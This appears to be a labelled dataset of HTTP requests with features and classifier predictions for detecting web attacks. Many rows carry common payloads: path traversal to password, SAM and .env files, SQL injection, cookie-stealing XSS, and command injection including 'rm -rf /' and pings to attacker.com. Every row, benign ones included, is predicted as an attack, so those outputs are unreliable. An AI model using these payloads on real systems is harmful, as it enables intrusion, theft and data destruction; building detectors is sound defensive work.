Method,URL,content,content-type,Cookie,Length,User-Agent,classification,url_length,path_depth,query_length,param_count,content_length,content_numbers,content_special_chars,has_hex_encoding,has_base64,contains_special_chars,contains_sql_injection,contains_xss,contains_command_injection,Accept,cookie,predicted_class,attack_probability
2,/download?file=..\..\..\windows\system32\config\sam,,0,1827,174,5,1,51,1,41,1,3,0,0,0,1,0,0,0,0,0,,1,0.9999305
3,/search?q=RWNKy,,0,1232,394,3,0,15,1,7,1,3,0,0,0,1,0,0,0,0,0,,1,0.999879
2,/download?file=../../../etc/passwd,,1,297,201,2,1,34,5,24,1,3,0,0,0,1,0,0,0,0,0,,1,0.99992836
2,/search?q=1; SELECT * FROM information_schema.tables,username='; DROP TABLE users; --,1,277,1852,0,1,52,1,44,1,32,0,6,0,0,1,1,0,1,0,,1,0.99996305
0,/download?file=../../.env,,1,896,1846,6,1,25,3,15,1,3,0,0,0,1,0,0,0,0,0,,1,0.99992836
3,/users/profile/ZeUH89Oj,,2,403,260,3,0,23,3,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
1,/index.html,,1,2401,391,4,0,11,1,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.99990106
2,/api/v1/resources/13,,2,149,162,4,0,20,4,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
0,/index.html,,2,813,74,1,0,11,1,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.99990106
3,/search?q=Pb4KD,param1=ghboz3I1&param2=7BIkV,0,1067,109,1,0,15,1,7,1,28,5,3,0,0,0,0,0,1,0,,1,0.99993706
1,/index.html,,0,56,130,3,0,11,1,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.99990106
0,/execute?cmd=ping | cat /etc/passwd,command=ls `ping -c 4 attacker.com`,0,174,1612,0,1,35,3,26,1,35,1,5,0,0,0,0,0,1,0,,1,0.999964
2,/execute?cmd=ping | cat /etc/passwd,command=ls & net user,1,1559,1113,5,1,35,3,26,1,21,0,2,0,0,0,0,0,1,0,,1,0.999956
1,/users/profile/iGYO2IQx,param1=jeTAcxX5&param2=3gMub,0,1717,16,3,0,23,3,0,0,28,4,3,0,0,0,0,0,1,0,,1,0.99993515
1,/products/18,param1=oxZsv74b&param2=JtdrV,0,2096,143,3,0,12,2,0,0,28,4,3,0,0,0,0,0,1,0,,1,0.9999521
1,/search?q=QlwzG,,0,1857,320,4,0,15,1,7,1,3,0,0,0,1,0,0,0,0,0,,1,0.999879
0,/page?id=<svg onload='alert(1)'>,comment=<svg onload='alert(1)'>,0,844,509,5,1,32,1,26,1,31,1,8,0,0,1,0,1,0,0,,1,0.99995255
3,/api/v1/resources/47,param1=HjqDu1ga&param2=nOZux,0,2186,72,3,0,20,4,0,0,28,3,3,0,0,0,0,0,1,0,,1,0.99993515
2,/search?q=RTweS,,2,731,158,3,0,15,1,7,1,3,0,0,0,1,0,0,0,0,0,,1,0.999879
3,/products/56,param1=fLjyg8aM&param2=hK8YU,2,265,139,4,0,12,2,0,0,28,4,3,0,0,0,0,0,1,0,,1,0.9999521
0,/search?q=lduiJ,param1=NxvcxQdz&param2=B9pyo,0,2420,326,4,0,15,1,7,1,28,3,3,0,0,0,0,0,1,0,,1,0.99993706
0,/index.html,param1=z4WTiVrS&param2=VHoWP,2,371,143,4,0,11,1,0,0,28,3,3,0,0,0,0,0,1,0,,1,0.9999485
1,/users/profile/4hB3UG7v,,1,605,397,3,0,23,3,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
2,/api/v1/resources/21,,2,1979,46,3,0,20,4,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
2,/api/v1/resources/1,,2,1270,394,4,0,19,4,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
2,/products/26,param1=xo2KXXfD&param2=9OLCX,2,2333,306,1,0,12,2,0,0,28,4,3,0,0,0,0,0,1,0,,1,0.9999521
0,/products/93,,0,1815,340,4,0,12,2,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.999908
1,/products/82,,2,185,404,3,0,12,2,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.999908
2,/products/1,param1=tyhmMYif&param2=hm76O,0,1039,291,1,0,11,2,0,0,28,4,3,0,0,0,0,0,1,0,,1,0.9999521
1,/api/v1/resources/26,param1=5qPaIN0N&param2=SLx7h,1,547,184,1,0,20,4,0,0,28,5,3,0,0,0,0,0,1,0,,1,0.99993515
2,/products/9,param1=AYH6lmFe&param2=vzFqN,1,2458,76,3,0,11,2,0,0,28,3,3,0,0,0,0,0,1,0,,1,0.9999521
2,/search?q='; DROP TABLE users; --,username=1' OR '1'='1,0,998,1573,0,1,33,1,25,1,21,3,6,0,0,1,1,0,1,0,,1,0.9999683
0,"/page?id='""><script>alert(1)</script>",comment=<img src='x' onerror='alert(1)'>,1,2293,1723,6,1,37,2,31,1,40,1,11,0,0,1,0,1,0,0,,1,0.9999505
0,/index.html,param1=xn0N2ulP&param2=iVerh,0,21,273,1,0,11,1,0,0,28,4,3,0,0,0,0,0,1,0,,1,0.9999485
3,/api/v1/resources/22,param1=uDdcusU4&param2=Mjue5,1,952,433,3,0,20,4,0,0,28,4,3,0,0,0,0,0,1,0,,1,0.99993515
1,/products/15,param1=2z4CeTtQ&param2=5ojqc,0,1770,154,1,0,12,2,0,0,28,5,3,0,0,0,0,0,1,0,,1,0.9999521
2,/index.html,,1,530,315,4,0,11,1,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.99990106
0,/search?q=toLbO,param1=PFtEpocc&param2=MBVHX,2,783,168,3,0,15,1,7,1,28,2,3,0,0,0,0,0,1,0,,1,0.99993706
2,/products/21,,0,2454,362,4,0,12,2,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.999908
3,/index.html,param1=7VQsZkBo&param2=Mt87c,0,1839,248,3,0,11,1,0,0,28,5,3,0,0,0,0,0,1,0,,1,0.9999485
3,/api/v1/resources/38,param1=Q3Buu8ic&param2=3hzcg,2,213,140,1,0,20,4,0,0,28,5,3,0,0,0,0,0,1,0,,1,0.99993515
3,/search?q=Khp8P,param1=1hNSuVpT&param2=IdUYh,2,925,454,4,0,15,1,7,1,28,3,3,0,0,0,0,0,1,0,,1,0.99993706
2,/search?q=FYK0p,param1=qICCfeXT&param2=wa4EV,2,1438,366,3,0,15,1,7,1,28,3,3,0,0,0,0,0,1,0,,1,0.99993706
0,/api/v1/resources/18,param1=PkFFvhj0&param2=TGPT4,2,1480,14,3,0,20,4,0,0,28,4,3,0,0,0,0,0,1,0,,1,0.99993515
2,/search?q=admin' --,username=admin' --,1,1598,928,5,1,19,1,11,1,18,0,4,0,0,1,0,0,0,0,,1,0.99993026
2,"/search?q=' UNION SELECT username, password FROM users --",username=' OR 1=1 --,1,947,1709,0,1,57,1,49,1,20,2,5,0,0,1,1,0,0,0,,1,0.99996376
2,/search?q='; DROP TABLE users; --,"username=' UNION SELECT username, password FROM users --",1,233,1001,5,1,33,1,25,1,56,0,5,0,0,1,1,0,1,0,,1,0.99996066
2,/products/82,param1=MBYR24XM&param2=x9gEJ,0,782,110,4,0,12,2,0,0,28,5,3,0,0,0,0,0,1,0,,1,0.9999521
3,/users/profile/R7Xnpdph,param1=iSL0oZ9S&param2=YnZHN,1,2479,435,4,0,23,3,0,0,28,4,3,0,0,0,0,0,1,0,,1,0.99993515
3,/api/v1/resources/5,,1,1951,178,3,0,19,4,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
0,/index.html,,0,1269,180,1,0,11,1,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.99990106
0,/download?file=file:///etc/passwd,,0,1166,1942,0,1,33,5,23,1,3,0,0,0,1,0,0,0,0,0,,1,0.99992836
3,/products/92,param1=LW6rkLMk&param2=TFfP8,0,1187,439,1,0,12,2,0,0,28,4,3,0,0,0,0,0,1,0,,1,0.9999521
2,/page?id=<script>alert('XSS')</script>,comment=<svg onload='alert(1)'>,0,1761,1724,5,1,38,2,32,1,31,1,8,0,0,1,0,1,0,0,,1,0.9999505
3,/products/31,,0,897,452,4,0,12,2,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.999908
3,/users/profile/OpPCfcB6,,0,1046,204,1,0,23,3,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
3,/index.html,param1=9pTYYCaK&param2=2DBuv,0,1953,224,1,0,11,1,0,0,28,4,3,0,0,0,0,0,1,0,,1,0.9999485
0,/api/v1/resources/48,,1,1776,321,3,0,20,4,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
0,/users/profile/E8NzwwAo,param1=VsCJJkpj&param2=lkxji,1,1788,313,4,0,23,3,0,0,28,2,3,0,0,0,0,0,1,0,,1,0.99993515
2,/download?file=../../.env,,1,1099,894,2,1,25,3,15,1,3,0,0,0,1,0,0,0,0,0,,1,0.99992836
0,/search?q=gs3Yt,,2,1687,346,3,0,15,1,7,1,3,0,0,0,1,0,0,0,0,0,,1,0.999879
0,/search?q=8FgmR,param1=hBEtZDwl&param2=0O21I,1,2404,167,3,0,15,1,7,1,28,5,3,0,0,0,0,0,1,0,,1,0.99993706
0,/search?q=6r966,param1=tW1DVIkM&param2=kenAV,1,284,47,4,0,15,1,7,1,28,3,3,0,0,0,0,0,1,0,,1,0.99993706
0,/products/6,param1=lkQBuf2g&param2=gHXGz,0,888,281,1,0,11,2,0,0,28,3,3,0,0,0,0,0,1,0,,1,0.9999521
3,/users/profile/aoz0fRft,,1,1240,66,1,0,23,3,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
0,/search?q=admin' --,username=1' OR '1'='1,0,444,257,7,1,19,1,11,1,21,3,6,0,0,1,0,0,0,0,,1,0.9999428
3,/index.html,param1=EC4cfTrs&param2=QQfAT,2,808,292,1,0,11,1,0,0,28,3,3,0,0,0,0,0,1,0,,1,0.9999485
0,/search?q=' OR 1=1 --,username=' OR 1=1 --,1,1498,1556,6,1,21,1,13,1,20,2,5,0,0,1,0,0,0,0,,1,0.99996066
1,/users/profile/l0Vz3ZYU,param1=PU8i05QE&param2=T0rfV,2,1445,68,1,0,23,3,0,0,28,6,3,0,0,0,0,0,1,0,,1,0.99993515
2,/execute?cmd=ping `ping -c 4 attacker.com`,command=ls ; rm -rf /,0,666,592,6,1,42,1,33,1,21,0,4,0,0,1,0,0,1,0,,1,0.9999573
0,/execute?cmd=ping | cat /etc/passwd,command=ls ; rm -rf /,1,111,668,6,1,35,3,26,1,21,0,4,0,0,1,0,0,1,0,,1,0.999956
1,/api/v1/resources/28,param1=Umn82Yft&param2=5Pw0E,1,436,456,4,0,20,4,0,0,28,6,3,0,0,0,0,0,1,0,,1,0.99993515
2,/download?file=file:///etc/passwd,,1,495,655,5,1,33,5,23,1,3,0,0,0,1,0,0,0,0,0,,1,0.99992836
0,/search?q=cgWRY,,0,2388,411,1,0,15,1,7,1,3,0,0,0,1,0,0,0,0,0,,1,0.999879
0,/users/profile/KZgkVlZa,,1,623,150,1,0,23,3,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
1,/api/v1/resources/18,param1=60wXhVgG&param2=9hy9T,2,975,22,1,0,20,4,0,0,28,6,3,0,0,0,0,0,1,0,,1,0.99993515
2,/products/94,,2,200,408,4,0,12,2,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.999908
3,/index.html,param1=eMY809gE&param2=1NFDW,0,933,177,4,0,11,1,0,0,28,6,3,0,0,0,0,0,1,0,,1,0.9999485
2,/users/profile/sCP6YDNG,param1=cphb3AyS&param2=PPFwT,1,967,92,1,0,23,3,0,0,28,3,3,0,0,0,0,0,1,0,,1,0.99993515
3,/index.html,,2,1255,47,1,0,11,1,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.99990106
3,/index.html,,2,1544,92,3,0,11,1,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.99990106
1,/search?q=pI3A9,,2,1388,138,3,0,15,1,7,1,3,0,0,0,1,0,0,0,0,0,,1,0.999879
3,/index.html,param1=Fi3KXdJn&param2=45bgB,2,1167,413,4,0,11,1,0,0,28,5,3,0,0,0,0,0,1,0,,1,0.9999485
0,/products/79,param1=zBSYBnf9&param2=3TEmQ,2,2392,357,3,0,12,2,0,0,28,4,3,0,0,0,0,0,1,0,,1,0.9999521
0,/users/profile/4wDLVyMA,param1=dY0Me3hQ&param2=lZQxR,2,101,19,4,0,23,3,0,0,28,4,3,0,0,0,0,0,1,0,,1,0.99993515
0,/execute?cmd=ping | cat /etc/passwd,command=ls `ping -c 4 attacker.com`,0,16,1559,6,1,35,3,26,1,35,1,5,0,0,0,0,0,1,0,,1,0.999964
1,/products/86,,0,2268,292,1,0,12,2,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.999908
0,/api/v1/resources/39,,1,2251,135,4,0,20,4,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
0,/index.html,,0,1619,127,1,0,11,1,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.99990106
0,/api/v1/resources/21,,2,2220,281,1,0,20,4,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
3,/products/17,,1,2150,237,1,0,12,2,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.999908
2,/index.html,param1=B7DWQaka&param2=szGmv,0,1459,168,4,0,11,1,0,0,28,3,3,0,0,0,0,0,1,0,,1,0.9999485
2,/search?q=leJAE,param1=5jLvsLLs&param2=aqhpF,1,1094,156,3,0,15,1,7,1,28,3,3,0,0,0,0,0,1,0,,1,0.99993706
2,/users/profile/3ElsckbH,param1=Z1QpyFxr&param2=uiMwI,2,457,352,4,0,23,3,0,0,28,3,3,0,0,0,0,0,1,0,,1,0.99993515
2,/users/profile/CWk2Zbfw,,2,866,160,3,0,23,3,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
0,/users/profile/aiNX1mqH,,1,1481,390,4,0,23,3,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
0,/search?q=7kF5V,,0,642,133,1,0,15,1,7,1,3,0,0,0,1,0,0,0,0,0,,1,0.999879
1,/products/84,param1=ILh47pdu&param2=aINUo,1,1109,101,1,0,12,2,0,0,28,4,3,0,0,0,0,0,1,0,,1,0.9999521
0,/search?q=3iesj,param1=MW0B4owm&param2=SY7pk,2,2415,316,3,0,15,1,7,1,28,5,3,0,0,0,0,0,1,0,,1,0.99993706
1,/api/v1/resources/3,param1=IdkV44Ud&param2=oZz81,1,1394,377,1,0,19,4,0,0,28,6,3,0,0,0,0,0,1,0,,1,0.99993515
1,/products/100,,0,1287,303,4,0,13,2,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.999908
1,/search?q=sDXny,,2,2053,126,4,0,15,1,7,1,3,0,0,0,1,0,0,0,0,0,,1,0.999879
0,/api/v1/resources/30,,1,475,73,3,0,20,4,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
2,/search?q=U1VNA,,1,984,194,3,0,15,1,7,1,3,0,0,0,1,0,0,0,0,0,,1,0.999879
1,/index.html,param1=Qr0cSfk9&param2=GtO5k,1,1798,56,1,0,11,1,0,0,28,5,3,0,0,0,0,0,1,0,,1,0.9999485
0,/users/profile/DRJiKDNs,,2,366,318,1,0,23,3,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
1,/api/v1/resources/36,,0,670,136,3,0,20,4,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
0,/page?id=<svg onload='alert(1)'>,comment=javascript:alert(document.cookie),1,427,578,0,1,32,1,26,1,41,0,5,0,0,1,0,1,0,0,,1,0.9999609
3,/products/53,param1=AJLWHshn&param2=xcpIW,2,209,82,1,0,12,2,0,0,28,2,3,0,0,0,0,0,1,0,,1,0.9999521
0,/index.html,param1=Evjo4QXb&param2=seULE,0,1426,15,3,0,11,1,0,0,28,3,3,0,0,0,0,0,1,0,,1,0.9999485
2,/products/8,param1=yMgobLW6&param2=Xz6Vm,1,2247,389,4,0,11,2,0,0,28,4,3,0,0,0,0,0,1,0,,1,0.9999521
0,/index.html,,1,817,160,3,0,11,1,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.99990106
2,/search?q=1' OR '1'='1,username=1' OR '1'='1,0,1385,1442,2,1,22,1,14,1,21,3,6,0,0,1,0,0,0,0,,1,0.99996006
2,/page?id=javascript:alert(document.cookie),comment=javascript:alert(document.cookie),1,1003,1166,5,1,42,1,36,1,41,0,5,0,0,0,0,1,0,0,,1,0.9999609
2,/users/profile/p50Nvq7i,param1=N2eXIKXh&param2=VoYDD,1,24,93,3,0,23,3,0,0,28,3,3,0,0,0,0,0,1,0,,1,0.99993515
2,/execute?cmd=ping || whoami,command=ls | cat /etc/passwd,1,2109,1256,5,1,27,1,18,1,28,0,4,0,0,0,0,0,1,0,,1,0.9999573
0,/page?id=<svg onload='alert(1)'>,comment=<script>alert('XSS')</script>,1,2398,1664,6,1,32,1,26,1,37,0,10,0,0,1,0,1,0,0,,1,0.9999497
3,/users/profile/2vNjdS7h,,0,1092,464,4,0,23,3,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
0,/download?file=..\..\..\windows\system32\config\sam,,0,615,506,0,1,51,1,41,1,3,0,0,0,1,0,0,0,0,0,,1,0.9999305
1,/products/6,param1=x2jIvXBr&param2=ADBMN,1,2010,488,4,0,11,2,0,0,28,3,3,0,0,0,0,0,1,0,,1,0.9999521
0,/search?q=admin' --,username=admin' --,0,1718,1206,7,1,19,1,11,1,18,0,4,0,0,1,0,0,0,0,,1,0.99993026
3,/api/v1/resources/30,,0,2124,312,4,0,20,4,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
3,/api/v1/resources/27,,2,1052,435,4,0,20,4,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
2,/users/profile/9aLr8OkX,,1,638,239,1,0,23,3,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
0,/products/56,,2,369,67,4,0,12,2,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.999908
2,"/page?id='""><script>alert(1)</script>",comment=<script>alert('XSS')</script>,0,94,1025,7,1,37,2,31,1,37,0,10,0,0,1,0,1,0,0,,1,0.9999474
2,/api/v1/resources/24,param1=SvRxox3R&param2=VbS3l,2,1580,164,3,0,20,4,0,0,28,4,3,0,0,0,0,0,1,0,,1,0.99993515
2,/search?q=1; SELECT * FROM information_schema.tables,"username=' UNION SELECT username, password FROM users --",1,1233,587,0,1,52,1,44,1,56,0,5,0,0,1,1,0,1,0,,1,0.99996066
2,/api/v1/resources/31,param1=zhfbDYQj&param2=K8jaD,1,1993,62,1,0,20,4,0,0,28,3,3,0,0,0,0,0,1,0,,1,0.99993515
0,/index.html,param1=h8IQChSn&param2=Xpbmd,2,1419,369,1,0,11,1,0,0,28,3,3,0,0,0,0,0,1,0,,1,0.9999485
3,/products/44,param1=07eHWkn8&param2=2Tflu,2,1865,317,1,0,12,2,0,0,28,6,3,0,0,0,0,0,1,0,,1,0.9999521
0,/api/v1/resources/34,,1,2334,273,4,0,20,4,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
0,/api/v1/resources/21,,1,407,361,4,0,20,4,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
3,/products/12,param1=RolTHpnJ&param2=K2jFY,2,2060,421,4,0,12,2,0,0,28,3,3,0,0,0,0,0,1,0,,1,0.9999521
2,/api/v1/resources/8,param1=qgsxUSMP&param2=cDs5P,2,1897,179,1,0,19,4,0,0,28,3,3,0,0,0,0,0,1,0,,1,0.99993515
0,/search?q=QFdgy,param1=r1Lo84EP&param2=CT34S,1,90,154,4,0,15,1,7,1,28,7,3,0,0,0,0,0,1,0,,1,0.99993706
2,/index.html,param1=1S6C7isd&param2=9XZYf,2,1869,267,1,0,11,1,0,0,28,6,3,0,0,0,0,0,1,0,,1,0.9999485
1,/users/profile/ov8496vn,,1,1086,499,4,0,23,3,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
2,/search?q=Lq2Bd,,2,1291,360,3,0,15,1,7,1,3,0,0,0,1,0,0,0,0,0,,1,0.999879
2,/execute?cmd=ping || whoami,command=ls ; rm -rf /,1,2408,913,0,1,27,1,18,1,21,0,4,0,0,1,0,0,1,0,,1,0.9999573
0,/execute?cmd=ping `ping -c 4 attacker.com`,command=ls ; rm -rf /,0,1510,1455,7,1,42,1,33,1,21,0,4,0,0,1,0,0,1,0,,1,0.9999573
2,/products/25,,0,770,19,1,0,12,2,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.999908
3,/users/profile/lnIHVFCG,param1=Psg3se5T&param2=DIl4j,1,583,276,3,0,23,3,0,0,28,5,3,0,0,0,0,0,1,0,,1,0.99993515
1,/search?q=Pxlwj,,2,1688,459,1,0,15,1,7,1,3,0,0,0,1,0,0,0,0,0,,1,0.999879
2,/users/profile/lC4dY6ON,,0,1234,397,3,0,23,3,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
2,/page?id=javascript:alert(document.cookie),comment=javascript:alert(document.cookie),0,1656,602,0,1,42,1,36,1,41,0,5,0,0,0,0,1,0,0,,1,0.9999609
2,/users/profile/7dWTvEjq,param1=8IxPzYTF&param2=BMvVU,1,1420,118,3,0,23,3,0,0,28,3,3,0,0,0,0,0,1,0,,1,0.99993515
0,/search?q=YpQDZ,,1,1990,130,3,0,15,1,7,1,3,0,0,0,1,0,0,0,0,0,,1,0.999879
2,/users/profile/K4mvzzGk,,0,1186,157,3,0,23,3,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
1,/users/profile/LyFdmaBy,param1=H2fMEA6l&param2=4upqo,0,1742,343,3,0,23,3,0,0,28,5,3,0,0,0,0,0,1,0,,1,0.99993515
2,/download?file=../../.env,,0,1640,534,2,1,25,3,15,1,3,0,0,0,1,0,0,0,0,0,,1,0.99992836
1,/index.html,param1=wE1qR4ys&param2=IMvxl,0,1462,13,4,0,11,1,0,0,28,4,3,0,0,0,0,0,1,0,,1,0.9999485
1,/users/profile/YyIcSJV9,,2,1062,451,1,0,23,3,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
2,/execute?cmd=ping ; rm -rf /,command=ls & net user,1,1413,1739,5,1,28,2,19,1,21,0,2,0,0,1,0,0,1,0,,1,0.999956
0,/products/98,,1,43,378,4,0,12,2,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.999908
3,/api/v1/resources/2,param1=alX6nXn2&param2=hNV0W,2,965,334,4,0,19,4,0,0,28,5,3,0,0,0,0,0,1,0,,1,0.99993515
2,/index.html,,1,261,361,4,0,11,1,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.99990106
0,/users/profile/tVGAoWjS,param1=vD3f1Dcf&param2=psFTH,0,1072,77,4,0,23,3,0,0,28,4,3,0,0,0,0,0,1,0,,1,0.99993515
3,/index.html,param1=6wugVYJq&param2=mU72T,1,617,450,3,0,11,1,0,0,28,5,3,0,0,0,0,0,1,0,,1,0.9999485
0,/index.html,param1=oBGPmfGz&param2=Tw1ur,2,2456,111,3,0,11,1,0,0,28,3,3,0,0,0,0,0,1,0,,1,0.9999485
2,/search?q=A99ig,,0,339,93,1,0,15,1,7,1,3,0,0,0,1,0,0,0,0,0,,1,0.999879
0,/api/v1/resources/3,,1,880,61,1,0,19,4,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
2,/products/2,,0,1374,146,3,0,11,2,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.999908
2,/search?q=' OR 1=1 --,username=1' OR '1'='1,0,360,159,2,1,21,1,13,1,21,3,6,0,0,1,0,0,0,0,,1,0.99996006
2,/search?q=1' OR '1'='1,"username=' UNION SELECT username, password FROM users --",1,207,1481,5,1,22,1,14,1,56,0,5,0,0,1,1,0,0,0,,1,0.99995565
1,/index.html,param1=Xguowb4u&param2=ocAp6,2,1991,239,4,0,11,1,0,0,28,4,3,0,0,0,0,0,1,0,,1,0.9999485
0,/index.html,,0,499,128,1,0,11,1,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.99990106
3,/products/5,param1=CdQdSJQS&param2=CC0pD,0,1697,223,3,0,11,2,0,0,28,3,3,0,0,0,0,0,1,0,,1,0.9999521
2,/search?q=EqVZ8,,1,1220,323,1,0,15,1,7,1,3,0,0,0,1,0,0,0,0,0,,1,0.999879
1,/search?q=exFZY,param1=30s28MTo&param2=6CJkU,1,1290,260,3,0,15,1,7,1,28,7,3,0,0,0,0,0,1,0,,1,0.99993706
1,/api/v1/resources/19,,1,847,264,3,0,20,4,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
3,/products/16,param1=iI6i1igj&param2=mJRQJ,2,1713,479,4,0,12,2,0,0,28,4,3,0,0,0,0,0,1,0,,1,0.9999521
1,/index.html,,2,733,221,4,0,11,1,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.99990106
2,/users/profile/fE1rVDoc,,1,192,483,1,0,23,3,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
3,/index.html,param1=pOLdUyjX&param2=Fp8w0,1,1802,211,4,0,11,1,0,0,28,4,3,0,0,0,0,0,1,0,,1,0.9999485
0,/users/profile/gROZihR9,param1=ujx0NPxL&param2=vrSIL,0,614,218,1,0,23,3,0,0,28,3,3,0,0,0,0,0,1,0,,1,0.99993515
3,/products/45,param1=El0XH47W&param2=bvdxy,1,600,385,1,0,12,2,0,0,28,5,3,0,0,0,0,0,1,0,,1,0.9999521
1,/api/v1/resources/18,,2,1635,326,3,0,20,4,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
1,/index.html,param1=Eu4HkA8y&param2=An8M1,1,2198,349,1,0,11,1,0,0,28,6,3,0,0,0,0,0,1,0,,1,0.9999485
2,/page?id=<img src='x' onerror='alert(1)'>,comment=javascript:alert(document.cookie),1,196,920,2,1,41,1,35,1,41,0,5,0,0,1,0,1,0,0,,1,0.9999609
3,/products/3,param1=e7rayQ7k&param2=m4FF5,2,1892,306,4,0,11,2,0,0,28,6,3,0,0,0,0,0,1,0,,1,0.9999521
1,/search?q=7Y1VG,param1=rs8gGigu&param2=ZN1u7,2,2322,344,1,0,15,1,7,1,28,5,3,0,0,0,0,0,1,0,,1,0.99993706
1,/search?q=cJloQ,,2,481,37,3,0,15,1,7,1,3,0,0,0,1,0,0,0,0,0,,1,0.999879
2,"/page?id='""><script>alert(1)</script>",comment=javascript:alert(document.cookie),0,1699,257,7,1,37,2,31,1,41,0,5,0,0,1,0,1,0,0,,1,0.9999591
0,/api/v1/resources/46,,2,784,494,3,0,20,4,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
2,/page?id=<img src='x' onerror='alert(1)'>,comment=javascript:alert(document.cookie),0,1260,1634,6,1,41,1,35,1,41,0,5,0,0,1,0,1,0,0,,1,0.9999609
1,/users/profile/Mr06IqMG,param1=8UJIi0d6&param2=ljwsQ,1,1550,465,1,0,23,3,0,0,28,5,3,0,0,0,0,0,1,0,,1,0.99993515
1,/api/v1/resources/18,param1=dpn9sdiT&param2=m0Wng,0,225,376,3,0,20,4,0,0,28,4,3,0,0,0,0,0,1,0,,1,0.99993515
0,/page?id=<img src='x' onerror='alert(1)'>,"comment='""><script>alert(1)</script>",0,811,352,6,1,41,1,35,1,36,1,11,0,0,1,0,1,0,0,,1,0.99995255
2,/search?q=' OR 1=1 --,username=admin' --,1,1996,228,6,1,21,1,13,1,18,0,4,0,0,1,0,0,0,0,,1,0.99995196
0,/download?file=../../.env,,1,1246,1290,5,1,25,3,15,1,3,0,0,0,1,0,0,0,0,0,,1,0.99992836
0,/search?q=h0o86,,0,1778,282,4,0,15,1,7,1,3,0,0,0,1,0,0,0,0,0,,1,0.999879
